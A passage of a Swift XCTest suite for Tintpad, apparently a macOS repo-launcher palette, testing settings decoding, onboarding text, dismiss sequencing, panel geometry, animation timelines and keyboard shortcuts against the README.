        XCTAssertEqual(LaunchGate.returnDisposition(inFlight: true, dismissing: false, noteShown: true),
                       .ignore)
    }

    func testReturnLaunchesAtRest() {
        XCTAssertEqual(LaunchGate.returnDisposition(inFlight: false, dismissing: false, noteShown: false),
                       .launch)
    }
}

/// `Scripts/uitest.sh` drives the real GUI and can only assert on side effects,
/// so its whole mode-cycle journey rests on one assumption: the marker template
/// `echo "[{mode}]" > …` writes the *flags of the mode that actually ran*. That
/// assumption lives in a shell script no CI job runs, and it would break
/// silently if `{mode}` ever started being quoted or space-collapsed. Pin it
/// here, where it costs nothing and fails loudly.
final class UITestHarnessContractTests: XCTestCase {
    private static let markerTemplate = #"touch /tmp/tp_A; echo "[{mode}]" > /tmp/tp_A_flags"#

    private func render(flags: String) -> String {
        CommandTemplate.preview(
            Self.markerTemplate,
            context: .init(repo: Repo(path: "/tmp/tintpad-uitest", name: "tintpad-uitest"),
                           mode: RunMode(name: "M", flags: flags, isDangerous: false, description: ""),
                           prompt: nil, branch: nil, remote: nil))
    }

    func testCycledModeFlagsReachTheMarker() {
        // What J4 greps for. The brackets matter: they keep `{mode}` off a space
        // boundary, so the empty-slot cleanup can't eat the surrounding text.
        XCTAssertTrue(render(flags: "--test-danger").contains("[--test-danger]"))
    }

    func testDefaultModeWritesAnEmptyMarker() {
        // And the Default mode must be distinguishable from it, or J4 would pass
        // whether or not ⇧⇥ did anything at all.
        XCTAssertTrue(render(flags: "").contains("[]"))
        XCTAssertFalse(render(flags: "").contains("--test-danger"))
    }
}

/// The tolerant decoder is load-bearing doctrine: a store that fails to decode
/// is a store that gets reseeded, which silently throws away the user's repos,
/// agents, and license. It had no coverage, so these pin the three ways a real
/// store.json drifts from the current struct.
final class SettingsDecodeTests: XCTestCase {
    private func decode(_ json: String) throws -> Settings {
        try JSONDecoder().decode(Settings.self, from: Data(json.utf8))
    }

    func testMissingKeysFallBackToDefaults() throws {
        // Adding a field must never invalidate an existing store.
        let s = try decode("{}")
        XCTAssertEqual(s.frecencyHalfLifeDays, 30)
        XCTAssertEqual(s.tintedChips, true)
        XCTAssertEqual(s.rootScanFolders, [])
        XCTAssertNil(s.licenseKey)
    }

    func testRetiredAndUnknownKeysDecodeAndDoNotDisturbTheRest() throws {
        // Keys from a future build, and from features since retired, must ride
        // along harmlessly rather than throwing the whole store away.
        let s = try decode("""
        {"frecencyHalfLifeDays":7,"somethingFromALaterVersion":{"nested":true},"panelWidth":900}
        """)
        XCTAssertEqual(s.frecencyHalfLifeDays, 7)
        XCTAssertEqual(s.tintedChips, true, "an unknown sibling key must not disturb defaults")
    }

    func testWronglyTypedValueFallsBackInsteadOfThrowing() throws {
        // A hand-edited or half-written store shouldn't cost the user everything.
        let s = try decode("""
        {"frecencyHalfLifeDays":"thirty","confirmDangerousModes":true}
        """)
        XCTAssertEqual(s.frecencyHalfLifeDays, 30)
        XCTAssertTrue(s.confirmDangerousModes, "a bad neighbor must not take valid keys with it")
    }

    // The accent and the theme picker are both retired, and their fields survive
    // only to round-trip. If either is ever deleted outright, this fails and the
    // deleter has to decide consciously to drop the stored value.
    func testRetiredAppearanceValuesRoundTrip() throws {
        let s = try decode("""
        {"tintAccent":"teal","appearance":"light"}
        """)
        XCTAssertEqual(s.tintAccent, .teal)
        XCTAssertEqual(s.appearance, .light)
        let again = try JSONDecoder().decode(Settings.self, from: JSONEncoder().encode(s))
        XCTAssertEqual(again.tintAccent, .teal)
        XCTAssertEqual(again.appearance, .light)
    }

    // The confirm gate is on for a brand-new store only. A store.json that
    // already exists keeps what its user had: missing the key means the build
    // that wrote it had no default of true, so it stays off.
    func testConfirmGateOnForNewStoresOnly() throws {
        XCTAssertTrue(Settings.defaults().confirmDangerousModes)
        XCTAssertTrue(StoreDocument.seeded().settings.confirmDangerousModes)
        XCTAssertFalse(try decode("{}").confirmDangerousModes)
        XCTAssertFalse(try decode(#"{"confirmDangerousModes":false}"#).confirmDangerousModes)
        XCTAssertTrue(try decode(#"{"confirmDangerousModes":true}"#).confirmDangerousModes)
        let doc = try JSONDecoder().decode(StoreDocument.self, from: Data(#"{"repos":[]}"#.utf8))
        XCTAssertFalse(doc.settings.confirmDangerousModes, "a store on disk without settings is not a new store")
        // A new store's true survives its own save and reload.
        let saved = try JSONEncoder().encode(Settings.defaults())
        XCTAssertTrue(try JSONDecoder().decode(Settings.self, from: saved).confirmDangerousModes)
    }
}

final class OnboardingCopyTests: XCTestCase {
    private let home = "/Users/me"

    func testFoundManyInOneRoot() {
        XCTAssertEqual(OnboardingCopy.reposLine(count: 14, existingRoots: ["/Users/me/Developer"], home: home),
                       "Found 14 repos in ~/Developer")
    }

    func testFoundOneIsSingular() {
        XCTAssertEqual(OnboardingCopy.reposLine(count: 1, existingRoots: ["/Users/me/Developer"], home: home),
                       "Found 1 repo in ~/Developer")
    }

    func testTwoRootsJoinWithAnd() {
        XCTAssertEqual(OnboardingCopy.reposLine(count: 3, existingRoots: ["/Users/me/Developer", "/Users/me/code"], home: home),
                       "Found 3 repos in ~/Developer and ~/code")
    }

    func testThreeRootsUseCommas() {
        XCTAssertEqual(OnboardingCopy.joined(["a", "b", "c"]), "a, b, and c")
    }

    func testNoneFoundYet() {
        XCTAssertEqual(OnboardingCopy.reposLine(count: 0, existingRoots: ["/Users/me/Developer"], home: home),
                       "No repos found in ~/Developer yet")
    }

    func testNoRootOnDiskAsksForAFolder() {
        XCTAssertEqual(OnboardingCopy.reposLine(count: 5, existingRoots: [], home: home),
                       "Add the folder your projects live in, Tintpad finds the repos inside it")
    }

    func testTildeAbbreviationOnlyAtAPathBoundary() {
        XCTAssertEqual(OnboardingCopy.abbreviate("/Users/me", home: home), "~")
        XCTAssertEqual(OnboardingCopy.abbreviate("/Users/me/x", home: "/Users/me/"), "~/x")
        XCTAssertEqual(OnboardingCopy.abbreviate("/Users/mex/code", home: home), "/Users/mex/code")
        XCTAssertEqual(OnboardingCopy.abbreviate("/Volumes/work", home: home), "/Volumes/work")
    }

    func testDoneLabelNamesTheHotkey() {
        XCTAssertEqual(OnboardingCopy.doneLabel(shortcut: "⌥Space"), "Done, press ⌥Space anytime")
        XCTAssertEqual(OnboardingCopy.doneLabel(shortcut: nil), "Done, press your hotkey anytime")
        XCTAssertEqual(OnboardingCopy.doneLabel(shortcut: ""), "Done, press your hotkey anytime")
    }
}

final class DismissSequencerTests: XCTestCase {
    private func shown() -> DismissSequencer {
        var s = DismissSequencer()
        _ = s.handle(.summon)
        return s
    }

    // Nothing leaves the screen until the panel is transparent: the only thing
    // a dismissal does in its own turn is blank.
    func testDismissBlanksBeforeOrderOut() {
        var s = shown()
        XCTAssertEqual(s.handle(.dismiss), [.blank])
        XCTAssertTrue(s.isDismissing)
        XCTAssertEqual(s.handle(.blankCommitted(generation: s.generation)), [.orderOut, .hideAppNextTurn])
        XCTAssertEqual(s.state, .hidden)
        XCTAssertFalse(s.isDismissing)
    }

    func testHideAppFollowsOrderOut() throws {
        var s = shown()
        _ = s.handle(.dismiss)
        let effects = s.handle(.blankCommitted(generation: s.generation))
        let orderOut = try XCTUnwrap(effects.firstIndex(of: .orderOut))
        let hideApp = try XCTUnwrap(effects.firstIndex(of: .hideAppNextTurn))
        XCTAssertLessThan(orderOut, hideApp, "the app hides only after the panel is gone")
    }

    func testStaleBlankCommitIsIgnored() {
        var s = shown()
        _ = s.handle(.dismiss)
        let first = s.generation
        _ = s.handle(.summon)
        _ = s.handle(.dismiss)
        XCTAssertEqual(s.handle(.blankCommitted(generation: first)), [],
                       "a commit queued for an earlier dismissal must not order out this one")
        XCTAssertTrue(s.isDismissing)
        XCTAssertEqual(s.handle(.blankCommitted(generation: s.generation)), [.orderOut, .hideAppNextTurn])
    }

    // The hotkey pressed twice fast: the second press lands while the first
    // dismissal is still blanking, and must bring the drop back, not leave it hidden.
    func testSummonDuringBlankCancelsPendingOrderOut() {
        var s = shown()
        _ = s.handle(.dismiss)
        let pending = s.generation
        XCTAssertEqual(s.handle(.summon), [.restoreAndOrderIn])
        XCTAssertEqual(s.state, .visible)
        XCTAssertEqual(s.handle(.blankCommitted(generation: pending)), [])
        XCTAssertEqual(s.state, .visible)
    }

    func testDoubleDismissIsIdempotent() {
        var s = shown()
        _ = s.handle(.dismiss)
        let generation = s.generation
        XCTAssertEqual(s.handle(.dismiss), [])
        XCTAssertEqual(s.generation, generation, "a second dismiss must not orphan the first commit")
        _ = s.handle(.blankCommitted(generation: generation))
        XCTAssertEqual(s.handle(.dismiss), [], "dismissing a hidden panel does nothing")
    }

    // No effects, but the generation moves, so a focus-loss hide deferred a
    // turn stands down when show() runs on an already-visible panel.
    func testSummonWhileVisibleBumpsGeneration() {
        var s = shown()
        let before = s.generation
        XCTAssertEqual(s.handle(.summon), [])
        XCTAssertEqual(s.state, .visible)
        XCTAssertGreaterThan(s.generation, before)
    }

    func testOrderOutDuringBlankCancelsPendingHide() {
        var s = shown()
        _ = s.handle(.dismiss)
        let pending = s.generation
        XCTAssertEqual(s.handle(.orderedOut), [])
        XCTAssertEqual(s.state, .hidden)
        XCTAssertEqual(s.handle(.blankCommitted(generation: pending)), [],
                       "the queued order-out and app hide must not run")
    }

    // Opening Settings orders the panel out directly. The next summon must still
    // restore it, or the drop comes back invisible at alpha 0.
    func testOrderOutOutsideTheSequenceStillRestoresOnSummon() {
        var s = shown()
        XCTAssertEqual(s.handle(.orderedOut), [])
        XCTAssertEqual(s.state, .hidden)
        XCTAssertEqual(s.handle(.summon), [.restoreAndOrderIn])
    }
}

final class DropGeometryTests: XCTestCase {
    private func notched(depth: CGFloat, housing: CGFloat = 200, max: CGFloat = 640) -> NotchGeometry {
        NotchGeometry(hasNotch: true, restHeight: depth, housingWidth: housing, maxWidth: max)
    }
    private let pill = NotchGeometry(hasNotch: false, restHeight: 0, housingWidth: 0, maxWidth: 640)

    // The capsule is as tall as the housing is deep, within 32...40.
    func testHousingDepthClampsTo32To40() {
        XCTAssertEqual(DropGeometry.resolve(notched(depth: 37), typeScale: 1).dropHeight, 37)
        XCTAssertEqual(DropGeometry.resolve(notched(depth: 24), typeScale: 1).dropHeight, 32)
        XCTAssertEqual(DropGeometry.resolve(notched(depth: 52), typeScale: 1).dropHeight, 40)
        // Dynamic Type scales the clamped height, not the other way round.
        XCTAssertEqual(DropGeometry.resolve(notched(depth: 52), typeScale: 1.25).dropHeight, 50)
    }

    func testPillIs36() {
        let d = DropGeometry.resolve(pill, typeScale: 1)
        XCTAssertEqual(d.dropHeight, 36)
        XCTAssertEqual(d.minWidth, 280)
        XCTAssertEqual(d.maxWidth, 640)
    }

    func testChipHeightIsDropMinusTwelve() {
        for g in [pill, notched(depth: 32), notched(depth: 37), notched(depth: 40)] {
            let d = DropGeometry.resolve(g, typeScale: 1.1)
            XCTAssertEqual(d.chipHeight, d.dropHeight - 12, accuracy: 0.0001)
            XCTAssertEqual(d.chipInsetResolved, 6, accuracy: 0.0001)
        }
    }

    // Notched, the capsule never tucks inside the housing's silhouette: one
    // capsule height of black either side of the camera.
    func testMinWidthHugsHousing() {
        XCTAssertEqual(DropGeometry.resolve(notched(depth: 37, housing: 200), typeScale: 1).minWidth, 274)
        // Never wider than the screen allows.
        XCTAssertEqual(DropGeometry.resolve(notched(depth: 37, housing: 600, max: 500), typeScale: 1).minWidth, 500)
    }

    func testHugWidthQuantizesUpTo8AndClamps() {
        XCTAssertEqual(DropGeometry.hugWidth(natural: 401, min: 280, max: 640), 408)
        XCTAssertEqual(DropGeometry.hugWidth(natural: 408, min: 280, max: 640), 408)
        XCTAssertEqual(DropGeometry.hugWidth(natural: 100, min: 280, max: 640), 280)
        XCTAssertEqual(DropGeometry.hugWidth(natural: 900, min: 280, max: 640), 640)
        // Rounding up never escapes the cap.
        XCTAssertEqual(DropGeometry.hugWidth(natural: 900, min: 280, max: 637), 637)
    }

    func testWindowHeightFormula() {
        let g = notched(depth: 37)
        XCTAssertEqual(DropGeometry.windowHeight(g, drop: .resolve(g, typeScale: 1)), 37 + 8 + 37 + 20)
        XCTAssertEqual(DropGeometry.windowHeight(pill, drop: .resolve(pill, typeScale: 1)), 0 + 8 + 36 + 20)
        XCTAssertEqual(DropGeometry.windowWidth(pill), 680)
    }

    // Typing narrows the row, but the capsule must not pull in under the
    // caret on every keystroke: with text in the field it only grows.
    func testHugRatchetNeverShrinksWhileTyping() {
        XCTAssertEqual(DropGeometry.ratchet(previous: 480, proposed: 400, queryEmpty: false), 480)
        XCTAssertEqual(DropGeometry.ratchet(previous: 480, proposed: 560, queryEmpty: false), 560)
        XCTAssertEqual(DropGeometry.ratchet(previous: 480, proposed: 480, queryEmpty: false), 480)
    }

    // An empty field (deleted back to nothing, or a fresh summon) re-hugs.
    func testHugReleasesWhenQueryEmpties() {
        XCTAssertEqual(DropGeometry.ratchet(previous: 560, proposed: 400, queryEmpty: true), 400)
        XCTAssertEqual(DropGeometry.ratchet(previous: 400, proposed: 560, queryEmpty: true), 560)
        // A whole typing session: grow, hold, release.
        var w: CGFloat = 400
        for proposed: CGFloat in [456, 320, 288] {
            w = DropGeometry.ratchet(previous: w, proposed: proposed, queryEmpty: false)
        }
        XCTAssertEqual(w, 456)
        XCTAssertEqual(DropGeometry.ratchet(previous: w, proposed: 400, queryEmpty: true), 400)
    }
}

final class DropSubjectTests: XCTestCase {
    // Capture modes and a pending confirm name their own repo, whatever else shows.
    func testConfirmAndCaptureModesNameTheirRepo() {
        XCTAssertEqual(DropSubject.pick(pending: "a", worktree: "w", prompt: "p", statusShown: true,
                                        launch: "l", selected: "s"), "a")
        XCTAssertEqual(DropSubject.pick(pending: nil, worktree: "w", prompt: nil, statusShown: true,
                                        launch: nil, selected: "s"), "w")
        XCTAssertEqual(DropSubject.pick(pending: nil, worktree: nil, prompt: "p", statusShown: false,
                                        launch: nil, selected: "s"), "p")
    }

    // "Scanned, 3 new repos" is about no repo, and must not borrow the selection.
    func testRepoLessStatusHasNoSubject() {
        XCTAssertNil(DropSubject.pick(pending: nil, worktree: nil, prompt: nil, statusShown: true,
                                      launch: nil as String?, selected: "s"))
        // A launch's own line (Opening, an error, a note) wears the launch's repo.
        XCTAssertEqual(DropSubject.pick(pending: nil, worktree: nil, prompt: nil, statusShown: true,
                                        launch: "l", selected: "s"), "l")
    }
}

@MainActor
final class StepSequencerTests: XCTestCase {
    /// A scheduler the test drains by hand, in time order.
    private final class ManualClock {
        var pending: [(at: TimeInterval, seq: Int, fire: @MainActor () -> Void)] = []
        private var seq = 0
        func schedule(_ at: TimeInterval, _ fire: @escaping @MainActor () -> Void) {
            pending.append((at, seq, fire)); seq += 1
        }
        @MainActor func drain() {
            while !pending.isEmpty {
                let next = pending.enumerated().min {
                    ($0.element.at, $0.element.seq) < ($1.element.at, $1.element.seq)
                }!
                pending.remove(at: next.offset)
                next.element.fire()
            }
        }
    }

    func testBeatsFireInOrder() {
        let clock = ManualClock()
        let s = StepSequencer(schedule: clock.schedule)
        var log: [String] = []
        s.run([
            .init(at: 0.2, action: { log.append("c") }),
            .init(at: 0, action: { log.append("a") }),
            .init(at: 0.2, action: { log.append("d") }),
            .init(at: 0.1, action: { log.append("b") }),
        ])
        XCTAssertTrue(log.isEmpty, "every beat goes through the scheduler, time 0 included")
        clock.drain()
        XCTAssertEqual(log, ["a", "b", "c", "d"])
    }

    func testCancelDropsPendingBeats() {
        let clock = ManualClock()
        let s = StepSequencer(schedule: clock.schedule)
        var log: [String] = []
        s.run([
            .init(at: 0, action: { log.append("a"); s.cancel() }),
            .init(at: 0, action: { log.append("same-turn") }),
            .init(at: 0.1, action: { log.append("b") }),
        ])
        clock.drain()
        XCTAssertEqual(log, ["a"])
    }

    // A re-summon mid-arrival: the old film stands down, the new one plays.
    func testRerunInvalidatesOlderGeneration() {
        let clock = ManualClock()
        let s = StepSequencer(schedule: clock.schedule)
        var log: [String] = []
        s.run([.init(at: 0, action: { log.append("old0") }),
               .init(at: 0.2, action: { log.append("old1") })])
        let first = s.generation
        s.run([.init(at: 0.1, action: { log.append("new") })])
        XCTAssertGreaterThan(s.generation, first)
        clock.drain()
        XCTAssertEqual(log, ["new"])
    }
}

final class DropTimelineTests: XCTestCase {
    private func ascending(_ beats: [DropTimeline.Beat]) -> Bool {
        zip(beats, beats.dropFirst()).allSatisfy { $0.at <= $1.at }
    }
    private func time(_ step: DropTimeline.Step, in beats: [DropTimeline.Beat]) -> TimeInterval? {
        beats.first { $0.step == step }?.at
    }

    func testArrivalBeatsAscendAndContentFollowsSpread() throws {
        let beats = DropTimeline.arrival(reduceMotion: false)
        XCTAssertTrue(ascending(beats))
        XCTAssertEqual(beats.map(\.step), [.bead, .spread, .contentA, .contentB])
        XCTAssertEqual(beats.map(\.at), [0, 0.07, 0.17, 0.20])
        let spread = try XCTUnwrap(time(.spread, in: beats))
        XCTAssertGreaterThan(try XCTUnwrap(time(.contentA, in: beats)), spread)
        XCTAssertGreaterThan(try XCTUnwrap(time(.contentB, in: beats)), try XCTUnwrap(time(.contentA, in: beats)))
    }

    func testExitCloseIsLastAndAfterAbsorb() throws {
        for reason in DismissReason.allCases {
            let beats = DropTimeline.exit(reason, reduceMotion: false)
            XCTAssertTrue(ascending(beats), "\(reason)")
            XCTAssertEqual(beats.last?.step, .close, "\(reason)")
            XCTAssertEqual(beats.filter { $0.step == .close }.count, 1, "\(reason)")
            if let absorb = time(.absorb, in: beats) {
                XCTAssertGreaterThan(try XCTUnwrap(time(.close, in: beats)), absorb)
            }
        }
        XCTAssertEqual(time(.close, in: DropTimeline.exit(.launch, reduceMotion: false)), 0.29)
        XCTAssertEqual(time(.close, in: DropTimeline.exit(.escape, reduceMotion: false)), 0.26)
        XCTAssertEqual(time(.close, in: DropTimeline.exit(.focusLoss, reduceMotion: false)), 0.15)
        XCTAssertNil(time(.absorb, in: DropTimeline.exit(.focusLoss, reduceMotion: false)),
                     "losing focus fades, it is not absorbed")
    }

    // Esc is the launch film, a touch quicker: the capsule shrinks before it
    // is absorbed, and the panel closes sooner than after a launch.
    func testEscapeShrinksBeforeAbsorbAndClosesSoonerThanLaunch() throws {
        let escape = DropTimeline.exit(.escape, reduceMotion: false)
        let launch = DropTimeline.exit(.launch, reduceMotion: false)
        for beats in [escape, launch] {
            XCTAssertLessThan(try XCTUnwrap(time(.shrink, in: beats)), try XCTUnwrap(time(.absorb, in: beats)))
            XCTAssertLessThanOrEqual(try XCTUnwrap(time(.contentOut, in: beats)), try XCTUnwrap(time(.shrink, in: beats)))
        }
        XCTAssertLessThan(try XCTUnwrap(time(.close, in: escape)), try XCTUnwrap(time(.close, in: launch)))
        XCTAssertLessThan(try XCTUnwrap(time(.absorb, in: escape)), try XCTUnwrap(time(.absorb, in: launch)))
    }

    func testReduceMotionIsACrossfade() {
        XCTAssertEqual(DropTimeline.arrival(reduceMotion: true), [.init(at: 0, step: .crossfadeIn)])
        for reason in DismissReason.allCases {
            XCTAssertEqual(DropTimeline.exit(reason, reduceMotion: true),
                           [.init(at: 0, step: .fade), .init(at: 0.13, step: .close)])
        }
    }
}

/// Which exit plays. The first request wins, and a focus loss while a launch
/// is in flight is the terminal taking focus, so it plays the launch exit.
final class DismissPolicyTests: XCTestCase {
    func testFirstDismissWins() {
        XCTAssertEqual(DismissPolicy.next(current: nil, requested: .escape, inFlight: false), .escape)
        XCTAssertEqual(DismissPolicy.next(current: .escape, requested: .launch, inFlight: false), .escape)
        XCTAssertEqual(DismissPolicy.next(current: .focusLoss, requested: .escape, inFlight: false), .focusLoss)
    }

    func testFocusLossDuringLaunchBecomesLaunchExit() {
        XCTAssertEqual(DismissPolicy.next(current: nil, requested: .focusLoss, inFlight: true), .launch)
        XCTAssertEqual(DismissPolicy.next(current: nil, requested: .focusLoss, inFlight: false), .focusLoss)
    }

    func testFocusLossNeverOverridesLaunchOrEscape() {
        for current in [DismissReason.launch, .escape] {
            for inFlight in [false, true] {
                XCTAssertEqual(DismissPolicy.next(current: current, requested: .focusLoss, inFlight: inFlight), current)
            }
        }
    }
}

/// The menu bar's "Palette keys" list against the README's Keys table, its
/// source, and against the keys the palette really handles.
final class PaletteKeysTests: XCTestCase {
    /// The README's Keys table rows as (keys, action), `<kbd>` markup removed.
    private func readmeRows() throws -> [PaletteKeys.Row] {
        let root = URL(fileURLWithPath: #filePath)
            .deletingLastPathComponent().deletingLastPathComponent().deletingLastPathComponent()
        let readme = try String(contentsOf: root.appendingPathComponent("README.md"), encoding: .utf8)
        let lines = readme.components(separatedBy: "\n")
        guard let start = lines.firstIndex(of: "## Keys") else { XCTFail("no Keys section"); return [] }
        var rows: [PaletteKeys.Row] = []
        for line in lines[(start + 1)...] {
            if line.hasPrefix("## ") { break }
            guard line.hasPrefix("| <kbd>") else { continue }
            let cells = line.split(separator: "|").map { $0.trimmingCharacters(in: .whitespaces) }
            guard cells.count == 2 else { XCTFail("unexpected row \(line)"); continue }
            let keys = cells[0].replacingOccurrences(of: "<kbd>", with: "")
                .replacingOccurrences(of: "</kbd>", with: "")
            rows.append(PaletteKeys.Row(keys: keys, action: cells[1]))
        }
        return rows
    }

    func testPaletteKeysAreUniqueAndCoverReadmeTable() throws {
        let keys = PaletteKeys.all.map(\.keys)
        XCTAssertEqual(Set(keys).count, keys.count)
        XCTAssertTrue(PaletteKeys.all.allSatisfy { !$0.keys.isEmpty && !$0.action.isEmpty })
        // The summon hotkey is global and configurable, not a palette key.
        let readme = try readmeRows().filter { !$0.action.hasPrefix("Summon") }
        XCTAssertEqual(PaletteKeys.all, readme)
    }

    // Pinned, so a key added to or dropped from the palette is a deliberate
    // edit here, in the README, and in `PaletteModel.handle(_:)` together.
    func testPaletteKeysArePinned() {
        XCTAssertEqual(PaletteKeys.all.map(\.keys), [
            "↑ ↓", "← →", "⏎", "⌘0", "⌘1–⌘9", "⌘⏎", "⌥⏎", "⇧⏎", "⌃⏎", "⌃W",
            "⇥ / ⇧⇥", "⌘L · ⌘P", "⌘R · Esc", "⌘,",
        ])
    }
}
